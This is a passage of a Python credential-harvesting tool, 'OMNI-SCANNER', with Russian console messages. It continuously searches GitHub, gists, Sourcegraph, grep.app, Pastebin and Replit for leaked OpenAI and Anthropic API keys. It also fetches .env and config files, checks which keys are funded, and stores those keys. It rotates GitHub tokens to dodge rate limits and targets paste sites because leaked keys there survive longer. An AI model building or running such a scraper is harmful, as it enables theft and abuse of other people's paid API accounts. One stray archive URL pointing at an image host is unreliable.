                        if commit_url:
                            tasks.append(self._fetch_commit(commit_url))
                        # Also check commit message
                        msg = item.get("commit", {}).get("message", "")
                        if msg:
                            tasks.append(self.process_text(msg, item.get("html_url", "unknown")))
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    break

                if result.status in (403, 429):
                    self._pool.mark_limited(token)
                    continue

                break
            await asyncio.sleep(0.5)

    async def _fetch_commit(self, url: str) -> None:
        while True:
            token = await self._pool.wait_for_available()
            if not token:
                return
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3.patch",
            }
            result = await self.http.get(url, headers=headers, timeout=10.0)
            if result is not None:
                self._pool.update_limits(token, result.headers)
            if result is not None and result.status in (403, 429):
                self._pool.mark_limited(token)
                continue
            if result is not None and result.status == 200 and result.body:
                await self.process_text(result.body, url)
            return


class GistEventsScanner(BaseScanner):
    """Continuous monitor of public gists. Polls every GIST_POLL_INTERVAL seconds."""

    def __init__(self, pool: TokenPool, *args: Any) -> None:
        super().__init__(*args)
        self._pool = pool
        self._seen_gists: set[str] = set()
        self._max_seen: int = 50_000

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[GistLive] Continuous gist monitoring started (every {GIST_POLL_INTERVAL}s){Style.RESET_ALL}")
        while True:
            try:
                await self._poll()
            except Exception as exc:
                logger.warning("[GistLive] Poll error: %s", exc)
            await asyncio.sleep(GIST_POLL_INTERVAL)

    async def _poll(self) -> None:
        # Fetch multiple pages of public gists for wider coverage
        all_tasks: list[Any] = []
        for page in range(1, 4):  # 3 pages = up to 300 gists
            result: HttpResult | None = None
            while True:
                token = await self._pool.wait_for_available()
                if not token:
                    return
                headers = {"Authorization": f"token {token}"}
                result = await self.http.get(
                    f"https://api.github.com/gists/public?per_page=100&page={page}",
                    headers=headers,
                )
                if result is not None:
                    self._pool.update_limits(token, result.headers)
                if result is not None and result.status in (403, 429):
                    self._pool.mark_limited(token)
                    continue
                break

            if result is None or result.status != 200:
                break

            data = result.json_data or []
            if not data:
                break

            new_on_page = 0
            for gist in data:
                gid = gist.get("id", "")
                if gid in self._seen_gists:
                    continue
                self._seen_gists.add(gid)
                new_on_page += 1
                for finfo in gist.get("files", {}).values():
                    raw = finfo.get("raw_url")
                    if raw:
                        all_tasks.append(self._fetch(raw))

            if new_on_page == 0:
                break
            await asyncio.sleep(0.3)

        tasks = all_tasks

        if len(self._seen_gists) > self._max_seen:
            to_keep = list(self._seen_gists)[-25_000:]
            self._seen_gists = set(to_keep)

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.warning("[GistLive] Fetch failed: %s", r)

    async def _fetch(self, url: str) -> None:
        text = await self.http.fetch_text(url)
        if text:
            await self.process_text(text, url)


class SourcegraphScanner(BaseScanner):
    """Searches Sourcegraph (sourcegraph.com) which does NOT require GitHub tokens.
    This provides an independent code search source that works even when all
    GitHub tokens are on cooldown."""

    _QUERIES: list[str] = [
        'sk-proj- count:100 type:file',
        'sk-ant-api count:100 type:file',
        'OPENAI_API_KEY sk- count:100 type:file',
        'ANTHROPIC_API_KEY sk-ant count:100 type:file',
        'sk-svcacct- count:50 type:file',
        'file:\\.env OPENAI_API_KEY count:100',
        'file:\\.env ANTHROPIC_API_KEY count:100',
        'file:\\.env.local sk-proj- count:50',
        'file:\\.env.local sk-ant- count:50',
        'file:config\\.json openai api_key count:50',
        'file:config\\.json anthropic api_key count:50',
        'sk-ant-api03- count:100 type:file',
        'sk-ant-api04- count:100 type:file',
        'file:secrets\\.py sk- count:50',
        'file:settings\\.py ANTHROPIC_API_KEY count:50',
    ]

    async def run(self) -> None:
        print(f"{Fore.CYAN}[Sourcegraph] Starting search (no GitHub tokens needed)...{Style.RESET_ALL}")
        for query in self._QUERIES:
            await self._search(query)
            await asyncio.sleep(2)  # Polite delay

    async def _search(self, query: str) -> None:
        print(f"{Fore.BLUE}[Sourcegraph] Search: {query[:60]}{Style.RESET_ALL}")
        # Sourcegraph streaming search API
        params = {"q": query}
        result = await self.http.get(
            "https://sourcegraph.com/.api/search/stream",
            params=params,
            headers={"Accept": "application/json"},
            timeout=30.0,
        )
        if result is None or result.status != 200:
            return

        # Parse the streaming response: look for "content" fields
        # that contain file contents / match snippets
        body = result.body
        # The response is Server-Sent Events; extract data lines
        for line in body.split("\n"):
            if not line.startswith("data:"):
                continue
            try:
                data = json.loads(line[5:])
            except (json.JSONDecodeError, ValueError):
                continue

            # Type "content" matches contain line content
            if isinstance(data, list):
                for match in data:
                    content = match.get("content", "") or match.get("lineMatches", "")
                    url = match.get("repository", "") + "/" + match.get("path", "")
                    if isinstance(content, list):
                        content = "\n".join(
                            lm.get("line", "") if isinstance(lm, dict) else str(lm)
                            for lm in content
                        )
                    if content and isinstance(content, str):
                        await self.process_text(content, f"sourcegraph:{url}")


class GrepAppScanner(BaseScanner):
    """Searches grep.app — a free code search engine indexing millions of
    public GitHub repos.  No tokens needed.  Returns repo + path which we
    convert to raw.githubusercontent.com URLs to fetch full file content."""

    _QUERIES: list[str] = [
        # --- Anthropic direct key prefixes ---
        "sk-ant-api03-",
        "sk-ant-api04-",
        "sk-ant-api05-",
        # --- Anthropic env vars with values ---
        "ANTHROPIC_API_KEY=sk-ant",
        "ANTHROPIC_API_KEY sk-ant",
        # --- OpenAI ---
        "sk-proj-",
        "OPENAI_API_KEY=sk-proj",
        "sk-svcacct-",
        # --- .env patterns ---
        'ANTHROPIC_API_KEY="sk-ant',
        'OPENAI_API_KEY="sk-proj',
        # --- Common leak patterns ---
        "api_key sk-ant-api03",
        "anthropic_key sk-ant",
        "claude_api_key sk-ant",
    ]

    async def run(self) -> None:
        print(f"{Fore.CYAN}[grep.app] Starting free code search ({len(self._QUERIES)} queries)...{Style.RESET_ALL}")
        for query in self._QUERIES:
            await self._search(query)
            await asyncio.sleep(2.0)  # Polite delay

    async def _search(self, query: str) -> None:
        print(f"{Fore.BLUE}[grep.app] Search: {query}{Style.RESET_ALL}")

        # grep.app returns up to 10 results per page; fetch pages 1-5
        for page in range(1, 6):
            params = {"q": query, "limit": "10", "offset": str((page - 1) * 10)}
            result = await self.http.get(
                "https://grep.app/api/search",
                params=params,
                timeout=15.0,
            )
            if result is None or result.status != 200:
                break

            data = result.json_data or {}
            hits = data.get("hits", {}).get("hits", [])
            if not hits:
                break

            tasks: list[Any] = []
            for hit in hits:
                repo = hit.get("repo", "")
                path = hit.get("path", "")
                branch = hit.get("branch", "main")
                if repo and path:
                    raw_url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"
                    tasks.append(self._fetch(raw_url))

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, Exception):
                        logger.warning("[grep.app] Fetch failed: %s", r)

            await asyncio.sleep(1.0)

    async def _fetch(self, url: str) -> None:
        text = await self.http.fetch_text(url, timeout=10.0)
        if text:
            await self.process_text(text, url)


class PastebinRecentScanner(BaseScanner):
    """Monitors Pastebin's scraping API for recent pastes containing API keys.
    Falls back to checking trending/recent paste lists if the scrape API
    is not available (requires whitelisted IP or PRO key).

    This is valuable because Anthropic does NOT actively monitor paste sites,
    so keys leaked there survive longer than on GitHub."""

    # Public paste archive pages (no API key needed)
    _ARCHIVE_URL = "https://pbs.twimg.com/pastebin.com/archive"

    async def run(self) -> None:
        print(f"{Fore.CYAN}[Pastebin] Checking recent public pastes...{Style.RESET_ALL}")
        await self._check_archive()

    async def _check_archive(self) -> None:
        """Fetch the public archive page and check each paste."""
        result = await self.http.get(
            "https://pastebin.com/archive",
            timeout=15.0,
        )
        if result is None or result.status != 200:
            logger.warning("[Pastebin] Archive page unavailable (status=%s)",
                           result.status if result else "None")
            return

        # Extract paste IDs from archive page (format: /XXXXXXXX)
        paste_ids = re.findall(r'href="/([a-zA-Z0-9]{8})"', result.body)
        unique_ids = list(dict.fromkeys(paste_ids))[:50]  # Dedupe, limit 50

        if not unique_ids:
            return

        print(f"{Fore.BLUE}[Pastebin] Checking {len(unique_ids)} recent pastes...{Style.RESET_ALL}")
        tasks = [self._fetch_paste(pid) for pid in unique_ids]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                logger.warning("[Pastebin] Fetch failed: %s", r)

    async def _fetch_paste(self, paste_id: str) -> None:
        text = await self.http.fetch_text(
            f"https://pastebin.com/raw/{paste_id}",
            timeout=8.0,
        )
        if text:
            await self.process_text(text, f"pastebin.com/{paste_id}")


class ReplitSearchScanner(BaseScanner):
    """Searches Replit for leaked API keys via their search page.
    Replit is a popular target because beginners frequently hardcode keys."""

    _QUERIES = [
        "sk-proj-",
        "sk-ant-api03",
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "sk-ant-",
    ]

    async def run(self) -> None:
        print(f"{Fore.CYAN}[Replit] Searching Replit projects...{Style.RESET_ALL}")
        for query in self._QUERIES:
            await self._search(query)
            await asyncio.sleep(2.0)

    async def _search(self, query: str) -> None:
        """Use Replit's search API to find projects."""
        result = await self.http.post(
            "https://replit.com/graphql",
            json_body={
                "operationName": "ReplSearch",
                "query": "query ReplSearch($search: String!, $after: String) { "
                         "replSearch(search: $search, after: $after, count: 20) { "
                         "items { ... on Repl { title url } } } }",
                "variables": {"search": query, "after": None},
            },
            headers={"Content-Type": "application/json"},
            timeout=15.0,
        )
        if result is None or result.status != 200:
            return

        data = result.json_data or {}
        items = (data.get("data", {}).get("replSearch", {}) or {}).get("items", [])
        tasks: list[Any] = []
        for item in items:
            repl_url = item.get("url", "")
            if repl_url:
                # Try to fetch common files from the repl
                for fname in [".env", "main.py", "index.js", "config.json"]:
                    raw = f"https://replit.com{repl_url}/{fname}"
                    tasks.append(self._fetch(raw))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    pass  # Replit often 404s, that's fine

    async def _fetch(self, url: str) -> None:
        text = await self.http.fetch_text(url, timeout=8.0)
        if text:
            await self.process_text(text, url)


# ============================================================================
# SECTION 11: MAIN
# ============================================================================


def _parse_key_line(line: str) -> str:
    """Parse a line from key file, handling both 'key' and 'N key' formats."""
    stripped = line.strip()
    if not stripped:
        return ""
    parts = stripped.split(" ", 1)
    if len(parts) == 2 and parts[0].isdigit():
        return parts[1]
    return stripped


def _load_existing_keys() -> set[str]:
    """Load all previously found keys from per-type funded files and empty file."""
    keys: set[str] = set()

    all_files = list(FUNDED_FILES.values()) + [EMPTY_TXT]
    for txt_path in all_files:
        if os.path.exists(txt_path):
            try:
                with open(txt_path, "r", encoding="utf-8") as f:
                    for line in f:
                        k = _parse_key_line(line)
                        if k:
                            keys.add(k)
            except OSError as exc:
                logger.error("Failed to read %s: %s", txt_path, exc)

    return keys


def _count_keys_in_file(file_path: str) -> dict[str, int]:
    """Count keys by type in a file."""
    counts: dict[str, int] = {"OpenAI": 0, "Anthropic": 0}

    if not os.path.exists(file_path):
        return counts

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                key = _parse_key_line(line)
                if not key:
                    continue
                if key.startswith("sk-ant-"):
                    counts["Anthropic"] += 1
                elif key.startswith("sk-"):
                    counts["OpenAI"] += 1
    except OSError:
        pass

    return counts


def _print_existing_keys_stats() -> None:
    """Print statistics of existing keys in per-type files."""
    total_funded = 0
    funded_by_type: dict[str, int] = {}

    for k_type, filename in FUNDED_FILES.items():
        if os.path.exists(filename):
            count = sum(1 for line in open(filename, "r", encoding="utf-8") if _parse_key_line(line))
        else:
            count = 0
        if count > 0:
            funded_by_type[k_type] = count
            total_funded += count

    empty_counts = _count_keys_in_file(EMPTY_TXT)
    total_empty = sum(empty_counts.values())

    if total_funded == 0 and total_empty == 0:
        print(f"{Fore.YELLOW}Ранее найденных ключей нет. Начинаем поиск...{Style.RESET_ALL}\n")
        return

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"📂 КЛЮЧИ В ФАЙЛАХ (предыдущие запуски)")
    print(f"{'='*60}{Style.RESET_ALL}")

    if total_funded > 0:
        print(f"{Fore.GREEN}💰 Funded ключи ({total_funded} шт):{Style.RESET_ALL}")
        for k_type, count in funded_by_type.items():
            filename = FUNDED_FILES[k_type]
            print(f"  {Fore.GREEN}{k_type}: {count}  [{filename}]{Style.RESET_ALL}")

    if total_empty > 0:
        print(f"\n{Fore.YELLOW}📭 {EMPTY_TXT} ({total_empty} шт):{Style.RESET_ALL}")
        active_types = {k: v for k, v in empty_counts.items() if v > 0}
        for k_type, count in active_types.items():
            print(f"  {k_type}: {count}")

    print(f"\n{Fore.CYAN}📊 Всего сохранено: {total_funded + total_empty} ключей")
    print(f"{'='*60}{Style.RESET_ALL}\n")


async def main() -> None:
    """Main entry point. Runs scanners in completely independent loops."""
    # Ensure output files exist
    for f_name in list(FUNDED_FILES.values()) + [EMPTY_TXT]:
        if not os.path.exists(f_name):
            open(f_name, "w", encoding="utf-8").close()

    print(f"{Fore.GREEN}=== OMNI-SCANNER v20.0 (grep.app + Pastebin + Replit + Split Tokens) ==={Style.RESET_ALL}")

    # Show existing keys statistics
    _print_existing_keys_stats()

    # Shared state
    existing_keys = _load_existing_keys()

    file_lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    http = HttpClient(semaphore)
    verifier = KeyVerifier(http)
    stats = KeyStats()

    # Token pool strategy:
    # With 3 tokens, reserve 1 exclusively for real-time (Events + Gists)
    # and give 2 to deep scan. With <3 tokens, share everything.
    cd = float(TOKEN_COOLDOWN_SECONDS)
    gitlab_pool = TokenPool(GITLAB_TOKENS, cooldown=cd)

    if len(GITHUB_TOKENS) >= 3:
        # Split: first token → real-time, rest → deep scan
        realtime_pool = TokenPool(GITHUB_TOKENS[:1], cooldown=cd)
        deepscan_pool = TokenPool(GITHUB_TOKENS[1:], cooldown=cd)
        print(f"{Fore.CYAN}[System] Token split: {realtime_pool.size} real-time + {deepscan_pool.size} deep scan{Style.RESET_ALL}")
    else:
        # Too few tokens to split — share
        realtime_pool = TokenPool(GITHUB_TOKENS, cooldown=cd)
        deepscan_pool = realtime_pool
        print(f"{Fore.CYAN}[System] Token pool shared: {realtime_pool.size} tokens{Style.RESET_ALL}")

    common: tuple[Any, ...] = (KEY_PATTERNS, verifier, file_lock, http, existing_keys, stats)

    # Periodic stats printer (every 5 minutes)
    async def stats_printer():
        while True:
            await asyncio.sleep(300)  # 5 minutes
            await stats.print_stats()

    # --- 1. REAL-TIME LOOP (dedicated token, never starved by deep scan) ---
    async def realtime_loop():
        if realtime_pool.empty: return
        print(f"{Fore.CYAN}[System] Real-time loop started ({realtime_pool.size} dedicated token).{Style.RESET_ALL}")
        # Events + Gists run forever in parallel
        await asyncio.gather(
            GitHubEventsScanner(realtime_pool, *common).run(),
            GistEventsScanner(realtime_pool, *common).run(),
            return_exceptions=True,
        )

    # --- 2. GITHUB DEEP SCAN LOOP (uses remaining tokens) ---
    async def github_loop():
        if deepscan_pool.empty: return
        print(f"{Fore.CYAN}[System] GitHub deep scan loop started ({deepscan_pool.size} tokens).{Style.RESET_ALL}")

        # Deep scan loop — run scanners SEQUENTIALLY to spread token usage
        while True:
            try:
                # 1. Code search (heaviest — uses the most API calls)
                print(f"{Fore.CYAN}[System] Phase 1/4: GitHub Code Search{Style.RESET_ALL}")
                await GitHubScanner(deepscan_pool, GITHUB_DORKS, *common).run()
                await asyncio.sleep(10)

                # 2. Gist search
                print(f"{Fore.CYAN}[System] Phase 2/4: Gist Search{Style.RESET_ALL}")
                await GistScanner(deepscan_pool, GIST_DORKS, *common).run()
                await asyncio.sleep(10)

                # 3. Issues search (lighter)
                print(f"{Fore.CYAN}[System] Phase 3/4: Issues Search{Style.RESET_ALL}")
                await GitHubIssuesScanner(deepscan_pool, *common).run()
                await asyncio.sleep(10)

                # 4. Commits search (lighter)
                print(f"{Fore.CYAN}[System] Phase 4/4: Commits Search{Style.RESET_ALL}")
                await GitHubCommitsScanner(deepscan_pool, *common).run()

                print(f"{Fore.MAGENTA}[System] GitHub deep scan finished. Sleeping {SLOW_LOOP_INTERVAL}s...{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"GitHub loop error: {e}")
            await asyncio.sleep(SLOW_LOOP_INTERVAL)

    # --- 2. GITLAB LOOP (Runs independently) ---
    async def gitlab_loop():
        if gitlab_pool.empty: return
        print(f"{Fore.CYAN}[System] GitLab loop started.{Style.RESET_ALL}")
        while True:
            try:
                scanner = GitLabScanner(gitlab_pool, GITLAB_DORKS, *common)
                await scanner.run()
                print(f"{Fore.MAGENTA}[System] GitLab deep scan finished. Sleeping {SLOW_LOOP_INTERVAL}s...{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"GitLab loop error: {e}")
            await asyncio.sleep(SLOW_LOOP_INTERVAL)

    # --- 3. OSINT LOOP (Runs even if GitHub is banned / no tokens) ---
    async def osint_loop():
        print(f"{Fore.CYAN}[System] OSINT (Web/NPM/HF/Sourcegraph/grep.app/Pastebin/Replit) loop started.{Style.RESET_ALL}")
        while True:
            try:
                # None of these require GitHub tokens
                scanners = [
                    GrepAppScanner(*common),
                    SourcegraphScanner(*common),
                    PastebinRecentScanner(*common),
                    ReplitSearchScanner(*common),
                    NpmScanner(PACKAGE_QUERIES, *common),
                    PyPiScanner(PACKAGE_QUERIES, *common),
                    HuggingFaceScanner(*common),
                    WebScanner(WEB_DORKS, *common),
                ]
                await asyncio.gather(*(s.run() for s in scanners), return_exceptions=True)
                print(f"{Fore.GREEN}[System] OSINT scan finished. Next in {SLOW_LOOP_INTERVAL}s...{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"OSINT loop error: {e}")
            await asyncio.sleep(SLOW_LOOP_INTERVAL)

    # --- RUN EVERYTHING ---
    try:
        tasks = [
            realtime_loop(),
            github_loop(),
            gitlab_loop(),
            osint_loop(),
            stats_printer()
        ]
        await asyncio.gather(*tasks)
    finally:
        print(f"\n{Fore.YELLOW}Завершение работы...{Style.RESET_ALL}")
        await stats.print_stats()
        await http.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped.")